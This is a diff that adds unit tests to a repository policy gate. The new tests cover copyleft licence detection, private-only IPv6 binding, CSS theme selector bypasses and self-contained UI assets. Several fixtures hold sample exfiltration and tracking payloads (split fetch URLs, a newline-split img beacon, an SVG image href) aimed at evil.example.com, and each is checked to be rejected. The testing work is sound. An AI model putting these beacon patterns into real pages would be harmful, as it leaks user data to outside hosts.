@@ -200,6 +200,53 @@ class PolicyGateTest(unittest.TestCase):
         self.assertEqual(r.returncode, 1)
         self.assertIn("LICENCE", r.stdout)
 
+    def test_vendored_agpl_and_lgpl_source_are_rejected(self) -> None:
+        """AGPL and LGPL had no coverage at all: the whole LICENCE section
+        only ever exercised the GPL path. Deleting AGPL and LGPL from
+        COPYLEFT_MARKERS left the suite green -- and those are the two
+        families that matter most here. CGRateS being AGPLv3 is the single
+        biggest architectural constraint on this project (ARCHITECTURE.md 3),
+        so the marker for it silently rotting is not a theoretical concern."""
+        cases = {
+            "agpl-spdx": "/* SPDX-License-Identifier: AGPL-3.0-only */\n",
+            "lgpl-spdx": "/* SPDX-License-Identifier: LGPL-2.1 */\n",
+            "agpl-fullname": "/* GNU AFFERO GENERAL PUBLIC LICENSE Version 3 */\n",
+            "lgpl-fullname": "/* GNU LESSER GENERAL PUBLIC LICENSE Version 2.1 */\n",
+        }
+        for name, header in cases.items():
+            with self.subTest(licence=name):
+                fx = self.fixture()
+                fx.write(f"vendor/{name}.c", header + "int main(void){return 0;}\n")
+                r = fx.run()
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("LICENCE", r.stdout)
+
+    def test_core_binding_a_public_ipv6_address_is_rejected(self) -> None:
+        """The entire IPv6 branch of CORE-PRIVATE had no coverage. Replacing
+        it with `continue` -- accepting any address at all -- left all tests
+        green. The core having no route from the internet is the single most
+        important structural claim in the design; it must not depend on
+        nobody having typed an IPv6 socket yet."""
+        fx = self.fixture()
+        fx.write("core/opensips/opensips.cfg",
+                 "socket=udp:[2001:db8::1]:5060\n"
+                 "route { route(relay); }\nroute[relay] { t_relay(); }\n")
+        r = fx.run()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("CORE-PRIVATE", r.stdout)
+        self.assertIn("2001:db8::1", r.stdout)
+
+    def test_core_binding_private_ipv6_is_accepted(self) -> None:
+        """Unique-local (fc00::/7) and loopback are the legitimate cases."""
+        for addr in ("fd00::10", "fc00::10", "::1"):
+            with self.subTest(addr=addr):
+                fx = self.fixture()
+                fx.write("core/opensips/opensips.cfg",
+                         f"socket=udp:[{addr}]:5060\n"
+                         "route { route(relay); }\nroute[relay] { t_relay(); }\n")
+                r = fx.run()
+                self.assertEqual(r.returncode, 0, r.stdout)
+
     def test_unscannable_dependency_manifest_is_rejected(self) -> None:
         """The gate must fail closed when the build grows a dependency surface it
         cannot yet inspect, rather than passing and creating the impression that
@@ -472,6 +519,114 @@ class PolicyGateTest(unittest.TestCase):
         positives gets disabled, which costs more than it ever caught."""
         r = self.page("<style>#chart-accepted { color: var(--mg-ink); }</style>"
                       "<script>const s = '&#39;';</script>")
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_non_canonical_selector_is_rejected(self) -> None:
+        """The worst bypass found. This gate keys blocks by selector TEXT and
+        has no model of the cascade, so a selector it does not recognise can
+        win in the browser having never been measured. Both of these rendered
+        an invisible --mg-ink-faint while the gate printed PASS."""
+        for label, selector in (
+                ("higher specificity", 'html:root[data-theme="dark"]'),
+                ("same specificity, later in source", '[data-theme="dark"]:root'),
+                ("class on the root", ':root.theme-dark')):
+            with self.subTest(selector=label):
+                css = self.tokens() + (
+                    f"\n{selector} {{\n"
+                    "  --mg-ink-faint: #14181B;\n"
+                    "  --mg-series-1: #12181C;\n"
+                    "}\n")
+                r = self.with_tokens(css)
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("THEME-SYNC", r.stdout)
+
+    def test_unknown_asset_type_under_ui_fails_closed(self) -> None:
+        """Matches the LICENCE rule's posture: a thing the browser can fetch
+        but this rule cannot read must fail, not be skipped. Otherwise the
+        rule is only as strong as the extension list somebody thought of."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/index.html", '<link rel="icon" href="favicon.ico">')
+        fx.write("ui/shield/favicon.ico", "not really an icon")
+        r = fx.run()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+        self.assertIn("no scanner", r.stdout)
+
+    def test_tooling_beside_the_ui_is_not_treated_as_an_asset(self) -> None:
+        """ui/validate_palette.py and ui/README.md live under ui/ and are
+        never served. Failing on them would make the rule unusable."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/validate_palette.py", "CHROMA_FLOOR = 0.10\n")
+        fx.write("ui/README.md", "# UI\n\nThe colour `#8B9AA0` is discussed here.\n")
+        r = fx.run()
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_fetch_must_name_a_same_origin_literal_path(self) -> None:
+        """No regex recognises a URL the author split with `+`. So the rule
+        requires the good shape instead of hunting the bad one: a literal
+        starting with '/'. Concatenation is then a violation on its face,
+        whatever it evaluates to."""
+        bad = (
+            '<script>const u = "ht" + "tps://evil.example.com/x"; fetch(u);</script>',
+            '<script>fetch(`https://evil.example.com/${x}`);</script>',
+            '<script>fetch(endpoint);</script>',
+            '<script>fetch(new URL("/v1/overview", base));</script>',
+        )
+        for body in bad:
+            with self.subTest(body=body):
+                r = self.page(body)
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_same_origin_literal_fetch_is_allowed(self) -> None:
+        r = self.page('<script>fetch("/v1/overview?window=1h");</script>')
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_other_request_channels_are_rejected(self) -> None:
+        for body in ('<script>new WebSocket("wss://x.example");</script>',
+                     '<script>new EventSource("/v1/stream");</script>',
+                     '<script>navigator.sendBeacon("/x", d);</script>',
+                     '<script>const r = new XMLHttpRequest();</script>'):
+            with self.subTest(body=body):
+                r = self.page(body)
+                self.assertEqual(r.returncode, 1, r.stdout)
+
+    def test_url_split_across_a_literal_newline_is_caught(self) -> None:
+        """HTML attribute values may contain newlines. A per-line scan saw
+        'https://' with nothing after it, then a hostname with no scheme."""
+        r = self.page('<img src="https://\nevil.example.com/beacon.png">')
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+
+    def test_svg_assets_are_scanned(self) -> None:
+        """An SVG is a document, not an image: it can carry <image href> to a
+        remote host, its own <style> and <script>, and raw fill="#…". Leaving
+        .svg out of the scanned set was a clean bypass of both halves of this
+        rule -- pull it in with <link rel="icon"> and neither the egress check
+        nor the colour check ever looked at it."""
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/index.html", '<link rel="icon" href="logo.svg">')
+        fx.write("ui/shield/logo.svg",
+                 '<svg xmlns="http://www.w3.org/2000/svg">\n'
+                 '  <image href="https://evil.example.com/track.png" />\n'
+                 '  <rect fill="#8B9AA0" />\n'
+                 '</svg>\n')
+        r = fx.run()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("UI-SELF-CONTAINED", r.stdout)
+        self.assertIn("evil.example.com", r.stdout)
+        self.assertIn("colour literal", r.stdout)
+
+    def test_svg_namespace_declaration_does_not_trip_the_svg_scan(self) -> None:
+        fx = self.fixture()
+        fx.write("ui/tokens.css", self.tokens())
+        fx.write("ui/shield/logo.svg",
+                 '<svg xmlns="http://www.w3.org/2000/svg">'
+                 '<rect fill="currentColor" /></svg>\n')
+        r = fx.run()
         self.assertEqual(r.returncode, 0, r.stdout)
 
     def test_url_hidden_after_a_js_line_comment_marker_is_still_seen(self) -> None:
